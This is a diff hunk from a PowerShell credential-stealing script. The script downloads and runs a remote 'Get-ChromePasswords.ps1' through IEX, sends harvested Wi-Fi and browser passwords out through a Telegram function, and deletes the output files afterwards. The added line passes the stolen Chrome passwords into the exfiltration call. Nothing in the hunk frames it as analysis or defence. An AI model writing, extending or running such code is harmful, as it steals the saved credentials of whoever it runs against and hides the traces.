@@ -17,6 +17,7 @@ $text = Get-Content .\Wi-Fi-PASS -Raw
 Send-Telegram -Message $text
 
 IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/MrAbhinavJindal/NetworkSharing/main/Get-ChromePasswords.ps1')) > Wi-Fi-PASS
+$text = Get-Content .\Wi-Fi-PASS -Raw
 Send-Telegram -Message $text
 
 Remove-Item *Wi-*
